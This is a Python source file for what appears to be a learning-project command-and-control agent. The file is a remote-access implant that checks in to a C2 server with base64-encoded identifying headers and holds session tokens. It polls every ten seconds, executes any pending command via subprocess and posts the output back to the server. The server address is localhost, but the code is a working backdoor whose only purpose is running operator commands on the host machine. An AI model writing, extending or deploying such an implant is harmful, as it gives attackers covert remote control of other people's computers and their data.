import requests
import json
from time import sleep
import subprocess
import sys

class Agent(object):

	url = "http://127.0.0.1:9000/"
	payload = "{\n\t\"agent_id\": 123,\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}"
	headers = {
	  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Content-Type': 'application/json',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK'
	}

	
	#response = requests.request("POST", url, headers=headers, data = payload)
	#response_json = response.json()


	def first_checkin(self):
		url = self.url + 'first_check_in'
		self.response = requests.request("POST",url,headers=self.headers,data = self.payload)
		self.response_json = self.response.json()
		self.doc_id = self.response_json['id']
		self.rev_num = self.response_json['rev']
		self.access_token = self.response_json['token']
		self.refresh_token = self.response_json['refresh']
		print(self.response_json)
		return

	def check(self):
		url = self.url + "poll"
		headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("GET",url,headers=headers)
		response_json = dict(response.json())
		print(response_json)
		self.updated_payload = response_json
		if response_json['pending_commands']:
			self.cmd = response_json['pending_commands'][0]
			cmd_split = self.cmd.split(" ")
			try:
				result = subprocess.run(cmd_split,capture_output=True)
				self.cmd_result = {self.cmd:result.stdout.decode("utf-8")}
				return True
			except:
				self.cmd_result = {self.cmd:"Error running command"}
				return True
		else:
			print("no command")
			return False











	def post_complete_command(self):
		url = self.url + "poll"
		self.updated_payload['pending_commands'].remove(self.cmd) ## removes pending command[0] 
		self.updated_payload['completed_commands'].append(self.cmd_result)
		print(self.updated_payload)
		headers = {"Content-Type":"application/json","doc_id":self.doc_id, "Authorization":"Bearer {}".format(self.access_token)}
		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload))
		print(response.text)
		print("completed post to database")






	def main(self):
		agent = Agent()
		agent.first_checkin()
		while True:
			sleep(10)
			if agent.check():
				agent.post_complete_command()
				print("posted to database")
			else:
				print("no commands found")

if __name__ == "__main__":
    Agent().main()